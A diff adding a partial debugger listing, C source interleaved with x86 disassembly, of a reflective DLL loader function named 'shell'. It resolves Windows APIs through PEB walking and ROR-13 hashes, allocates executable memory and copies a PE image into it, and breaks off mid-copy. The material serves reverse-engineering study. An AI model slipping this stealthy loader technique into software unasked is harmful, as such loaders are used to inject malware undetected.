@@ -1,0 +1,945 @@
+189:  int shell()
+190:  {
+00405600 55                   push        ebp
+00405601 8B EC                mov         ebp,esp
+00405603 81 EC 98 00 00 00    sub         esp,98h
+00405609 53                   push        ebx
+0040560A 56                   push        esi
+0040560B 57                   push        edi
+0040560C 8D BD 68 FF FF FF    lea         edi,[ebp-98h]
+00405612 B9 26 00 00 00       mov         ecx,26h
+00405617 B8 CC CC CC CC       mov         eax,0CCCCCCCCh
+0040561C F3 AB                rep stos    dword ptr [edi]
+191:
+192:      LOADLIBRARYA pLoadLibraryA     = NULL;
+0040561E C7 45 FC 00 00 00 00 mov         dword ptr [ebp-4],0
+193:      GETPROCADDRESS pGetProcAddress = NULL;
+00405625 C7 45 F8 00 00 00 00 mov         dword ptr [ebp-8],0
+194:      VIRTUALALLOC pVirtualAlloc     = NULL;
+0040562C C7 45 F4 00 00 00 00 mov         dword ptr [ebp-0Ch],0
+195:      NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
+00405633 C7 45 F0 00 00 00 00 mov         dword ptr [ebp-10h],0
+196:
+197:      USHORT usCounter;
+198:      // the initial location of this image in memory(旧展开前镜像的地址)
+199:      ULONG_PTR uiLibraryAddress;
+200:      // the kernels base address and later this images newly loaded base address(新展开后镜像的地址)
+201:      ULONG_PTR uiBaseAddress;
+202:
+203:      ULONG_PTR uiAddressArray;
+204:      ULONG_PTR uiNameArray;
+205:      ULONG_PTR uiExportDir;
+206:      ULONG_PTR uiNameOrdinals;
+207:      DWORD dwHashValue;
+208:
+209:      // variables for loading this image
+210:      ULONG_PTR uiHeaderValue;
+211:      ULONG_PTR uiValueA;
+212:      ULONG_PTR uiValueB;
+213:      ULONG_PTR uiValueC;
+214:      ULONG_PTR uiValueD;
+215:      ULONG_PTR uiValueE;
+216:
+217:      __asm
+218:      {
+219:          mov eax, 0x00400000;
+0040563A B8 00 00 40 00       mov         eax,400000h
+220:          mov uiLibraryAddress, eax;
+0040563F 89 45 E8             mov         dword ptr [ebp-18h],eax
+221:      }
+222:      _asm {
+223:          mov eax, fs: [0x18];//找到teb
+00405642 64 A1 18 00 00 00    mov         eax,fs:[00000018]
+224:          mov eax, [eax + 0x30];//peb
+00405648 8B 40 30             mov         eax,dword ptr [eax+30h]
+225:          mov eax, [eax + 0x0c];//PEB_LDR_DATA
+0040564B 8B 40 0C             mov         eax,dword ptr [eax+0Ch]
+226:          mov eax, [eax + 0x0c];//LIST_ENTRY 主模块
+0040564E 8B 40 0C             mov         eax,dword ptr [eax+0Ch]
+227:          mov uiValueA, eax;
+00405651 89 45 C8             mov         dword ptr [ebp-38h],eax
+228:      }
+229:      while(uiValueA)
+00405654 83 7D C8 00          cmp         dword ptr [ebp-38h],0
+00405658 0F 84 DA 02 00 00    je          shell+338h (00405938)
+230:      {
+231:          // get pointer to current modules name (unicode string)
+232:          uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
+0040565E 8B 45 C8             mov         eax,dword ptr [ebp-38h]
+00405661 8B 48 30             mov         ecx,dword ptr [eax+30h]
+00405664 89 4D C4             mov         dword ptr [ebp-3Ch],ecx
+233:          // set bCounter to the length for the loop
+234:          usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
+00405667 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+0040566A 66 8B 42 2C          mov         ax,word ptr [edx+2Ch]
+0040566E 66 89 45 EC          mov         word ptr [ebp-14h],ax
+235:          // clear uiValueC which will store the hash of the module name
+236:          uiValueC = 0;
+00405672 C7 45 C0 00 00 00 00 mov         dword ptr [ebp-40h],0
+237:
+238:          // compute the hash of the module name...
+239:          do
+240:          {
+241:              uiValueC = ROR( (DWORD)uiValueC );
+00405679 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+0040567C C1 C9 0D             ror         ecx,0Dh
+0040567F 89 4D C0             mov         dword ptr [ebp-40h],ecx
+242:              // normalize to uppercase if the madule name is in lowercase
+243:              if( *((BYTE *)uiValueB) >= 'a' )
+00405682 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+00405685 33 C0                xor         eax,eax
+00405687 8A 02                mov         al,byte ptr [edx]
+00405689 83 F8 61             cmp         eax,61h
+0040568C 7C 13                jl          shell+0A1h (004056a1)
+244:                  uiValueC += *((BYTE *)uiValueB) - 0x20;
+0040568E 8B 4D C4             mov         ecx,dword ptr [ebp-3Ch]
+00405691 33 D2                xor         edx,edx
+00405693 8A 11                mov         dl,byte ptr [ecx]
+00405695 8B 45 C0             mov         eax,dword ptr [ebp-40h]
+00405698 8D 4C 10 E0          lea         ecx,[eax+edx-20h]
+0040569C 89 4D C0             mov         dword ptr [ebp-40h],ecx
+245:              else
+0040569F EB 0F                jmp         shell+0B0h (004056b0)
+246:                  uiValueC += *((BYTE *)uiValueB);
+004056A1 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+004056A4 33 C0                xor         eax,eax
+004056A6 8A 02                mov         al,byte ptr [edx]
+004056A8 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+004056AB 03 C8                add         ecx,eax
+004056AD 89 4D C0             mov         dword ptr [ebp-40h],ecx
+247:              uiValueB++;
+004056B0 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+004056B3 83 C2 01             add         edx,1
+004056B6 89 55 C4             mov         dword ptr [ebp-3Ch],edx
+248:          } while( --usCounter );
+004056B9 66 8B 45 EC          mov         ax,word ptr [ebp-14h]
+004056BD 66 2D 01 00          sub         ax,offset shell+0BFh (004056bf)
+004056C1 66 89 45 EC          mov         word ptr [ebp-14h],ax
+004056C5 8B 4D EC             mov         ecx,dword ptr [ebp-14h]
+004056C8 81 E1 FF FF 00 00    and         ecx,0FFFFh
+004056CE 85 C9                test        ecx,ecx
+004056D0 75 A7                jne         shell+79h (00405679)
+249:
+250:          // compare the hash with that of kernel32.dll
+251:          if( (DWORD)uiValueC == KERNEL32DLL_HASH )
+004056D2 81 7D C0 5B BC 4A 6A cmp         dword ptr [ebp-40h],6A4ABC5Bh
+004056D9 0F 85 34 01 00 00    jne         shell+213h (00405813)
+252:          {
+253:              // get this modules base address
+254:              uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
+004056DF 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+004056E2 8B 42 18             mov         eax,dword ptr [edx+18h]
+004056E5 89 45 E4             mov         dword ptr [ebp-1Ch],eax
+255:
+256:              // get the VA of the modules NT Header
+257:              uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
+004056E8 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+004056EB 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+004056EE 03 51 3C             add         edx,dword ptr [ecx+3Ch]
+004056F1 89 55 D8             mov         dword ptr [ebp-28h],edx
+258:
+259:              // uiNameArray = the address of the modules export directory entry
+260:              uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
+004056F4 8B 45 D8             mov         eax,dword ptr [ebp-28h]
+004056F7 83 C0 78             add         eax,78h
+004056FA 89 45 DC             mov         dword ptr [ebp-24h],eax
+261:
+262:              // get the VA of the export directory
+263:              uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
+004056FD 8B 4D DC             mov         ecx,dword ptr [ebp-24h]
+00405700 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+00405703 03 11                add         edx,dword ptr [ecx]
+00405705 89 55 D8             mov         dword ptr [ebp-28h],edx
+264:
+265:              // get the VA for the array of name pointers
+266:              uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
+00405708 8B 45 D8             mov         eax,dword ptr [ebp-28h]
+0040570B 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+0040570E 03 48 20             add         ecx,dword ptr [eax+20h]
+00405711 89 4D DC             mov         dword ptr [ebp-24h],ecx
+267:
+268:              // get the VA for the array of name ordinals
+269:              uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );
+00405714 8B 55 D8             mov         edx,dword ptr [ebp-28h]
+00405717 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+0040571A 03 42 24             add         eax,dword ptr [edx+24h]
+0040571D 89 45 D4             mov         dword ptr [ebp-2Ch],eax
+270:
+271:              usCounter = 3;
+00405720 66 C7 45 EC 03 00    mov         word ptr [ebp-14h],offset shell+124h (00405724)
+272:
+273:              // loop while we still have imports to find
+274:              while( usCounter > 0 )
+00405726 8B 4D EC             mov         ecx,dword ptr [ebp-14h]
+00405729 81 E1 FF FF 00 00    and         ecx,0FFFFh
+0040572F 85 C9                test        ecx,ecx
+00405731 0F 8E D7 00 00 00    jle         shell+20Eh (0040580e)
+275:              {
+276:                  // compute the hash values for this function name
+277:                  char* p1 = (char *)( uiBaseAddress + DEREF_32( uiNameArray ) );
+00405737 8B 55 DC             mov         edx,dword ptr [ebp-24h]
+0040573A 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+0040573D 03 02                add         eax,dword ptr [edx]
+0040573F 89 45 B4             mov         dword ptr [p1],eax
+278:                  //dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
+279:                  DWORD dwHashValue = 0;
+00405742 C7 45 B0 00 00 00 00 mov         dword ptr [dwHashValue],0
+280:                  do
+281:                  {
+282:                      dwHashValue = ROR( dwHashValue );
+00405749 8B 4D B0             mov         ecx,dword ptr [dwHashValue]
+0040574C C1 C9 0D             ror         ecx,0Dh
+0040574F 89 4D B0             mov         dword ptr [dwHashValue],ecx
+283:                      dwHashValue += *p1;
+00405752 8B 55 B4             mov         edx,dword ptr [p1]
+00405755 0F BE 02             movsx       eax,byte ptr [edx]
+00405758 8B 4D B0             mov         ecx,dword ptr [dwHashValue]
+0040575B 03 C8                add         ecx,eax
+0040575D 89 4D B0             mov         dword ptr [dwHashValue],ecx
+284:                  } while( *++p1 );
+00405760 8B 55 B4             mov         edx,dword ptr [p1]
+00405763 83 C2 01             add         edx,1
+00405766 89 55 B4             mov         dword ptr [p1],edx
+00405769 8B 45 B4             mov         eax,dword ptr [p1]
+0040576C 0F BE 08             movsx       ecx,byte ptr [eax]
+0040576F 85 C9                test        ecx,ecx
+00405771 75 D6                jne         shell+149h (00405749)
+285:
+286:                  // if we have found a function we want we get its virtual address
+287:                  if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH )
+00405773 81 7D B0 8E 4E 0E EC cmp         dword ptr [dwHashValue],0EC0E4E8Eh
+0040577A 74 12                je          shell+18Eh (0040578e)
+0040577C 81 7D B0 AA FC 0D 7C cmp         dword ptr [dwHashValue],7C0DFCAAh
+00405783 74 09                je          shell+18Eh (0040578e)
+00405785 81 7D B0 54 CA AF 91 cmp         dword ptr [dwHashValue],91AFCA54h
+0040578C 75 69                jne         shell+1F7h (004057f7)
+288:                  {
+289:                      // get the VA for the array of addresses
+290:                      uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
+0040578E 8B 55 D8             mov         edx,dword ptr [ebp-28h]
+00405791 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+00405794 03 42 1C             add         eax,dword ptr [edx+1Ch]
+00405797 89 45 E0             mov         dword ptr [ebp-20h],eax
+291:
+292:                      // use this functions name ordinal as an index into the array of name pointers
+293:                      uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
+0040579A 8B 4D D4             mov         ecx,dword ptr [ebp-2Ch]
+0040579D 33 D2                xor         edx,edx
+0040579F 66 8B 11             mov         dx,word ptr [ecx]
+004057A2 8B 45 E0             mov         eax,dword ptr [ebp-20h]
+004057A5 8D 0C 90             lea         ecx,[eax+edx*4]
+004057A8 89 4D E0             mov         dword ptr [ebp-20h],ecx
+294:
+295:                      // store this functions VA
+296:                      if( dwHashValue == LOADLIBRARYA_HASH )
+004057AB 81 7D B0 8E 4E 0E EC cmp         dword ptr [dwHashValue],0EC0E4E8Eh
+004057B2 75 0D                jne         shell+1C1h (004057c1)
+297:                          pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
+004057B4 8B 55 E0             mov         edx,dword ptr [ebp-20h]
+004057B7 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+004057BA 03 02                add         eax,dword ptr [edx]
+004057BC 89 45 FC             mov         dword ptr [ebp-4],eax
+298:                      else if( dwHashValue == GETPROCADDRESS_HASH )
+004057BF EB 2A                jmp         shell+1EBh (004057eb)
+004057C1 81 7D B0 AA FC 0D 7C cmp         dword ptr [dwHashValue],7C0DFCAAh
+004057C8 75 0D                jne         shell+1D7h (004057d7)
+299:                          pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
+004057CA 8B 4D E0             mov         ecx,dword ptr [ebp-20h]
+004057CD 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+004057D0 03 11                add         edx,dword ptr [ecx]
+004057D2 89 55 F8             mov         dword ptr [ebp-8],edx
+300:                      else if( dwHashValue == VIRTUALALLOC_HASH )
+004057D5 EB 14                jmp         shell+1EBh (004057eb)
+004057D7 81 7D B0 54 CA AF 91 cmp         dword ptr [dwHashValue],91AFCA54h
+004057DE 75 0B                jne         shell+1EBh (004057eb)
+301:                          pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );
+004057E0 8B 45 E0             mov         eax,dword ptr [ebp-20h]
+004057E3 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+004057E6 03 08                add         ecx,dword ptr [eax]
+004057E8 89 4D F4             mov         dword ptr [ebp-0Ch],ecx
+302:
+303:                      // decrement our counter
+304:                      usCounter--;
+004057EB 66 8B 55 EC          mov         dx,word ptr [ebp-14h]
+004057EF 66 83 EA 01          sub         dx,1
+004057F3 66 89 55 EC          mov         word ptr [ebp-14h],dx
+305:                  }
+306:
+307:                  // get the next exported function name
+308:                  uiNameArray += sizeof(DWORD);
+004057F7 8B 45 DC             mov         eax,dword ptr [ebp-24h]
+004057FA 83 C0 04             add         eax,4
+004057FD 89 45 DC             mov         dword ptr [ebp-24h],eax
+309:
+310:                  // get the next exported function name ordinal
+311:                  uiNameOrdinals += sizeof(WORD);
+00405800 8B 4D D4             mov         ecx,dword ptr [ebp-2Ch]
+00405803 83 C1 02             add         ecx,2
+00405806 89 4D D4             mov         dword ptr [ebp-2Ch],ecx
+312:              }
+00405809 E9 18 FF FF FF       jmp         shell+126h (00405726)
+313:          }
+314:          else if( (DWORD)uiValueC == NTDLLDLL_HASH )
+0040580E E9 FE 00 00 00       jmp         shell+311h (00405911)
+00405813 81 7D C0 5D 68 FA 3C cmp         dword ptr [ebp-40h],3CFA685Dh
+0040581A 0F 85 F1 00 00 00    jne         shell+311h (00405911)
+315:          {
+316:              // get this modules base address
+317:              uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
+00405820 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405823 8B 42 18             mov         eax,dword ptr [edx+18h]
+00405826 89 45 E4             mov         dword ptr [ebp-1Ch],eax
+318:
+319:              // get the VA of the modules NT Header
+320:              uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
+00405829 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+0040582C 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+0040582F 03 51 3C             add         edx,dword ptr [ecx+3Ch]
+00405832 89 55 D8             mov         dword ptr [ebp-28h],edx
+321:
+322:              // uiNameArray = the address of the modules export directory entry
+323:              uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
+00405835 8B 45 D8             mov         eax,dword ptr [ebp-28h]
+00405838 83 C0 78             add         eax,78h
+0040583B 89 45 DC             mov         dword ptr [ebp-24h],eax
+324:
+325:              // get the VA of the export directory
+326:              uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
+0040583E 8B 4D DC             mov         ecx,dword ptr [ebp-24h]
+00405841 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+00405844 03 11                add         edx,dword ptr [ecx]
+00405846 89 55 D8             mov         dword ptr [ebp-28h],edx
+327:
+328:              // get the VA for the array of name pointers
+329:              uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
+00405849 8B 45 D8             mov         eax,dword ptr [ebp-28h]
+0040584C 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+0040584F 03 48 20             add         ecx,dword ptr [eax+20h]
+00405852 89 4D DC             mov         dword ptr [ebp-24h],ecx
+330:
+331:              // get the VA for the array of name ordinals
+332:              uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );
+00405855 8B 55 D8             mov         edx,dword ptr [ebp-28h]
+00405858 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+0040585B 03 42 24             add         eax,dword ptr [edx+24h]
+0040585E 89 45 D4             mov         dword ptr [ebp-2Ch],eax
+333:
+334:              usCounter = 1;
+00405861 66 C7 45 EC 01 00    mov         word ptr [ebp-14h],offset shell+265h (00405865)
+335:
+336:              // loop while we still have imports to find
+337:              while( usCounter > 0 )
+00405867 8B 4D EC             mov         ecx,dword ptr [ebp-14h]
+0040586A 81 E1 FF FF 00 00    and         ecx,0FFFFh
+00405870 85 C9                test        ecx,ecx
+00405872 0F 8E 99 00 00 00    jle         shell+311h (00405911)
+338:              {
+339:                  // compute the hash values for this function name
+340:                  //dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
+341:                  char* p1 = (char *)( uiBaseAddress + DEREF_32( uiNameArray ) );
+00405878 8B 55 DC             mov         edx,dword ptr [ebp-24h]
+0040587B 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+0040587E 03 02                add         eax,dword ptr [edx]
+00405880 89 45 AC             mov         dword ptr [p1],eax
+342:                  DWORD dwHashValue = 0;
+00405883 C7 45 A8 00 00 00 00 mov         dword ptr [dwHashValue],0
+343:                  do
+344:                  {
+345:                      dwHashValue = ROR( dwHashValue );
+0040588A 8B 4D A8             mov         ecx,dword ptr [dwHashValue]
+0040588D C1 C9 0D             ror         ecx,0Dh
+00405890 89 4D A8             mov         dword ptr [dwHashValue],ecx
+346:                      dwHashValue += *p1;
+00405893 8B 55 AC             mov         edx,dword ptr [p1]
+00405896 0F BE 02             movsx       eax,byte ptr [edx]
+00405899 8B 4D A8             mov         ecx,dword ptr [dwHashValue]
+0040589C 03 C8                add         ecx,eax
+0040589E 89 4D A8             mov         dword ptr [dwHashValue],ecx
+347:                  } while( *++p1 );
+004058A1 8B 55 AC             mov         edx,dword ptr [p1]
+004058A4 83 C2 01             add         edx,1
+004058A7 89 55 AC             mov         dword ptr [p1],edx
+004058AA 8B 45 AC             mov         eax,dword ptr [p1]
+004058AD 0F BE 08             movsx       ecx,byte ptr [eax]
+004058B0 85 C9                test        ecx,ecx
+004058B2 75 D6                jne         shell+28Ah (0040588a)
+348:                  // if we have found a function we want we get its virtual address
+349:                  if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
+004058B4 81 7D A8 B8 0A 4C 53 cmp         dword ptr [dwHashValue],534C0AB8h
+004058BB 75 3D                jne         shell+2FAh (004058fa)
+350:                  {
+351:                      // get the VA for the array of addresses
+352:                      uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
+004058BD 8B 55 D8             mov         edx,dword ptr [ebp-28h]
+004058C0 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+004058C3 03 42 1C             add         eax,dword ptr [edx+1Ch]
+004058C6 89 45 E0             mov         dword ptr [ebp-20h],eax
+353:
+354:                      // use this functions name ordinal as an index into the array of name pointers
+355:                      uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
+004058C9 8B 4D D4             mov         ecx,dword ptr [ebp-2Ch]
+004058CC 33 D2                xor         edx,edx
+004058CE 66 8B 11             mov         dx,word ptr [ecx]
+004058D1 8B 45 E0             mov         eax,dword ptr [ebp-20h]
+004058D4 8D 0C 90             lea         ecx,[eax+edx*4]
+004058D7 89 4D E0             mov         dword ptr [ebp-20h],ecx
+356:
+357:                      // store this functions VA
+358:                      if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
+004058DA 81 7D A8 B8 0A 4C 53 cmp         dword ptr [dwHashValue],534C0AB8h
+004058E1 75 0B                jne         shell+2EEh (004058ee)
+359:                          pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );
+004058E3 8B 55 E0             mov         edx,dword ptr [ebp-20h]
+004058E6 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+004058E9 03 02                add         eax,dword ptr [edx]
+004058EB 89 45 F0             mov         dword ptr [ebp-10h],eax
+360:
+361:                      // decrement our counter
+362:                      usCounter--;
+004058EE 66 8B 4D EC          mov         cx,word ptr [ebp-14h]
+004058F2 66 83 E9 01          sub         cx,1
+004058F6 66 89 4D EC          mov         word ptr [ebp-14h],cx
+363:                  }
+364:
+365:                  // get the next exported function name
+366:                  uiNameArray += sizeof(DWORD);
+004058FA 8B 55 DC             mov         edx,dword ptr [ebp-24h]
+004058FD 83 C2 04             add         edx,4
+00405900 89 55 DC             mov         dword ptr [ebp-24h],edx
+367:
+368:                  // get the next exported function name ordinal
+369:                  uiNameOrdinals += sizeof(WORD);
+00405903 8B 45 D4             mov         eax,dword ptr [ebp-2Ch]
+00405906 83 C0 02             add         eax,2
+00405909 89 45 D4             mov         dword ptr [ebp-2Ch],eax
+370:              }
+0040590C E9 56 FF FF FF       jmp         shell+267h (00405867)
+371:          }
+372:
+373:          // we stop searching when we have found everything we need.
+374:          if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache )
+00405911 83 7D FC 00          cmp         dword ptr [ebp-4],0
+00405915 74 14                je          shell+32Bh (0040592b)
+00405917 83 7D F8 00          cmp         dword ptr [ebp-8],0
+0040591B 74 0E                je          shell+32Bh (0040592b)
+0040591D 83 7D F4 00          cmp         dword ptr [ebp-0Ch],0
+00405921 74 08                je          shell+32Bh (0040592b)
+00405923 83 7D F0 00          cmp         dword ptr [ebp-10h],0
+00405927 74 02                je          shell+32Bh (0040592b)
+375:              break;
+00405929 EB 0D                jmp         shell+338h (00405938)
+376:
+377:          // get the next entry
+378:          uiValueA = DEREF( uiValueA );
+0040592B 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+0040592E 8B 11                mov         edx,dword ptr [ecx]
+00405930 89 55 C8             mov         dword ptr [ebp-38h],edx
+379:      }
+00405933 E9 1C FD FF FF       jmp         shell+54h (00405654)
+380:
+381:      // STEP 2: load our image into a new permanent location in memory...
+382:
+383:      // get the VA of the NT Header for the PE to be loaded
+384:      uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
+00405938 8B 45 E8             mov         eax,dword ptr [ebp-18h]
+0040593B 8B 4D E8             mov         ecx,dword ptr [ebp-18h]
+0040593E 03 48 3C             add         ecx,dword ptr [eax+3Ch]
+00405941 89 4D CC             mov         dword ptr [ebp-34h],ecx
+385:
+386:      // allocate all the memory for the DLL to be loaded into. we can load at any address because we will
+387:      // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
+388:      uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+00405944 8B F4                mov         esi,esp
+00405946 6A 40                push        40h
+00405948 68 00 30 00 00       push        3000h
+0040594D 8B 55 CC             mov         edx,dword ptr [ebp-34h]
+00405950 8B 42 50             mov         eax,dword ptr [edx+50h]
+00405953 50                   push        eax
+00405954 6A 00                push        0
+00405956 FF 55 F4             call        dword ptr [ebp-0Ch]
+00405959 3B F4                cmp         esi,esp
+0040595B E8 60 7D 00 00       call        __chkesp (0040d6c0)
+00405960 89 45 E4             mov         dword ptr [ebp-1Ch],eax
+389:
+390:      // we must now copy over the headers
+391:      uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
+00405963 8B 4D CC             mov         ecx,dword ptr [ebp-34h]
+00405966 8B 51 54             mov         edx,dword ptr [ecx+54h]
+00405969 89 55 C8             mov         dword ptr [ebp-38h],edx
+392:      uiValueB = uiLibraryAddress;
+0040596C 8B 45 E8             mov         eax,dword ptr [ebp-18h]
+0040596F 89 45 C4             mov         dword ptr [ebp-3Ch],eax
+393:      uiValueC = uiBaseAddress;
+00405972 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+00405975 89 4D C0             mov         dword ptr [ebp-40h],ecx
+394:
+395:      while( uiValueA-- )
+00405978 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+0040597B 8B 45 C8             mov         eax,dword ptr [ebp-38h]
+0040597E 83 E8 01             sub         eax,1
+00405981 89 45 C8             mov         dword ptr [ebp-38h],eax
+00405984 85 D2                test        edx,edx
+00405986 74 1E                je          shell+3A6h (004059a6)
+396:          *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;
+00405988 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+0040598B 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+0040598E 8A 02                mov         al,byte ptr [edx]
+00405990 88 01                mov         byte ptr [ecx],al
+00405992 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+00405995 83 C1 01             add         ecx,1
+00405998 89 4D C0             mov         dword ptr [ebp-40h],ecx
+0040599B 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+0040599E 83 C2 01             add         edx,1
+004059A1 89 55 C4             mov         dword ptr [ebp-3Ch],edx
+004059A4 EB D2                jmp         shell+378h (00405978)
+397:
+398:      // STEP 3: load in all of our sections...
+399:
+400:      // uiValueA = the VA of the first section
+401:      uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
+004059A6 8B 45 CC             mov         eax,dword ptr [ebp-34h]
+004059A9 33 C9                xor         ecx,ecx
+004059AB 66 8B 48 14          mov         cx,word ptr [eax+14h]
+004059AF 8B 55 CC             mov         edx,dword ptr [ebp-34h]
+004059B2 8D 44 0A 18          lea         eax,[edx+ecx+18h]
+004059B6 89 45 C8             mov         dword ptr [ebp-38h],eax
+402:
+403:      // itterate through all sections, loading them into memory.
+404:      uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
+004059B9 8B 4D CC             mov         ecx,dword ptr [ebp-34h]
+004059BC 33 D2                xor         edx,edx
+004059BE 66 8B 51 06          mov         dx,word ptr [ecx+6]
+004059C2 89 55 B8             mov         dword ptr [ebp-48h],edx
+405:      while( uiValueE-- )
+004059C5 8B 45 B8             mov         eax,dword ptr [ebp-48h]
+004059C8 8B 4D B8             mov         ecx,dword ptr [ebp-48h]
+004059CB 83 E9 01             sub         ecx,1
+004059CE 89 4D B8             mov         dword ptr [ebp-48h],ecx
+004059D1 85 C0                test        eax,eax
+004059D3 74 5A                je          shell+42Fh (00405a2f)
+406:      {
+407:          // uiValueB is the VA for this section
+408:          uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );
+004059D5 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+004059D8 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+004059DB 03 42 0C             add         eax,dword ptr [edx+0Ch]
+004059DE 89 45 C4             mov         dword ptr [ebp-3Ch],eax
+409:
+410:          // uiValueC if the VA for this sections data
+411:          uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );
+004059E1 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+004059E4 8B 55 E8             mov         edx,dword ptr [ebp-18h]
+004059E7 03 51 14             add         edx,dword ptr [ecx+14h]
+004059EA 89 55 C0             mov         dword ptr [ebp-40h],edx
+412:
+413:          // copy the section over
+414:          uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
+004059ED 8B 45 C8             mov         eax,dword ptr [ebp-38h]
+004059F0 8B 48 10             mov         ecx,dword ptr [eax+10h]
+004059F3 89 4D BC             mov         dword ptr [ebp-44h],ecx
+415:
+416:          while( uiValueD-- )
+004059F6 8B 55 BC             mov         edx,dword ptr [ebp-44h]
+004059F9 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+004059FC 83 E8 01             sub         eax,1
+004059FF 89 45 BC             mov         dword ptr [ebp-44h],eax
+00405A02 85 D2                test        edx,edx
+00405A04 74 1E                je          shell+424h (00405a24)
+417:              *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
